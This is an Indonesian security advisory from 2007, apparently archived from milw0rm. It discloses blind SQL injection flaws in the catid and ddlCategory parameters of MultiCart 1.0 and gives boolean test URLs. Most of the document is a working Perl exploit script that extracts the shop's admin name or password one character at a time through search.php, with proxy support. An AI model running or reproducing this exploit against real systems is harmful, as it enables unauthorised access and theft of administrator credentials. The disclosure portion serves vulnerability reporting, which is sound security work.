# Indonesian Newhack Security Advisory
# ------------------------------------
# MultiCart 1.0 Remote Blind SQL Injection
# Waktu			:  Sep 30 2007 02:00AM
# Software		:  MultiCart 1.0
# Vendor		:  http://www.iscripts.com/multicart/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
#
#  ----
#  /categorydetail.php?catid=[BLIND SQLI]
#  parameter "catid" pada categorydetail.php tidak terfilter dengan baik, 
#  sehingga mengizinkan penyerang untuk memanipulasi SQL query pada parameter "catid"
#  contoh ; 
#  http://localhost/categorydetail.php?catid=1'AND 1=1/*
#  http://localhost/categorydetail.php?catid=1'AND 1=2/*
#  ----
#  /search.php?chkProductName=on&chkIncludeSubcategories=on&sd=1&txtSearch=&ddlCategory=[BLIND SQLI]
#  parameter "ddlCategory" pada search.php tidak terfilter dengan baik, 
#  sehingga mengizinkan penyerang untuk memanipulasi SQL query pada parameter "ddlCategory"
#  contoh ; 
#  http://localhost/search.php?chkProductName=on&chkIncludeSubcategories=on&sd=1&txtSearch=&ddlCategory=1 AND 1=2  
#  http://localhost/search.php?chkProductName=on&chkIncludeSubcategories=on&sd=1&txtSearch=&ddlCategory=1 AND 1=1
#  ----
#
#  Terima Kasih untuk;
#  str0ke, DNX, xoron
#  nyubi,iFX,kin9k0ng,bius,selikoer,aldy_BT
#  Komunitas Security dan Hacker Indonesia
#  -[opt1lc, fl3xu5, ghoz]- yang telah memberikan nuansa baru untuk Newhack
#
#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
 print "\n  |-------------------------------------------------|";
 print "\n  |         Indonesian Newhack Technology           |";
 print "\n  |-------------------------------------------------|";
 print "\n  | MultiCart 1.0 (search.php) Blind SQL Injection  |";
 print "\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |";
 print "\n  |   DNX Code [dnx(at)hackermail.com] | Modified   |";
 print "\n  |-------------------------------------------------|";
 print "\n[!] ";
 print "\n[!] Bug: in the search.php script, u can inject sql code in the (ddlCategory) parameter";
 print "\n[!] Usage: perl multicart.pl [Host] [Path] <Options>";
 print "\n[!] Example: perl multicart.pl 127.0.0.1 /cart/ -c 10 -o 1 -t multicart_config";
 print "\n[!] Options:";
 print "\n       -c [no]       Valid ddlCategory Search, default is 1";
 print "\n       -o [no]       1 = get admin name (default)";
 print "\n                     2 = get admin password";
 print "\n       -t [name]     Changes the settings table name, default is multicart_settings";
 print "\n       -p [ip:port]  Proxy support";
 print "\n";
 exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $cat     = 1;
my $column  = "admin_name";
my $table   = "multicart_settings";
my %options = ();
GetOptions(\%options, "c=i", "o=i", "t=s", "p=s");

print "[!] Exploiting...\n";

if($options{"c"}) { $cat = $options{"c"}; }
if($options{"o"} && $options{"o"} == 2) { $column = "admin_password"; }
if($options{"t"}) { $table = $options{"t"}; }

syswrite(STDOUT, "[!] Data : ", 12);

for(my $i = 1; $i <= 32; $i++)
{
 my $found = 0;
 my $h = 48;
 while(!$found && $h <= 57)
 {
   if(istrue2($host, $path, $table, $i, $h))
   {
     $found = 1;
     syswrite(STDOUT, chr($h), 1);
   }
   $h++;
 }
 if(!$found)
 {
   $h = 97;
   while(!$found && $h <= 122)
   {
     if(istrue2($host, $path, $table, $i, $h))
     {
       $found = 1;
       syswrite(STDOUT, chr($h), 1);
     }
     $h++;
   }
 }
}

print "\n[!] Exploit done\n";

sub istrue2
{
 my $host  = shift;
 my $path  = shift;
 my $table = shift;
 my $i     = shift;
 my $h     = shift;

 my $ua = LWP::UserAgent->new;
 my $url = "http://".$host.$path."search.php?chkProductName=on&chkIncludeSubcategories=on&sd=1&txtSearch=&ddlCategory=".$cat."%20AND%20SUBSTRING((SELECT%20".$column."%20FROM%20".$table."%20LIMIT%200,1),".$i.",1)=CHAR(".$h.")";

 if($options{"p"})
 {
   $ua->proxy('http', "http://".$options{"p"});
 }

 my $response = $ua->get($url);
 my $content = $response->content;
 my $regexp = "navigate";

 if($content =~ /$regexp/)
 {
   return 1;
 }
 else
 {
   return 0;
 }
}

# milw0rm.com [2007-10-02]
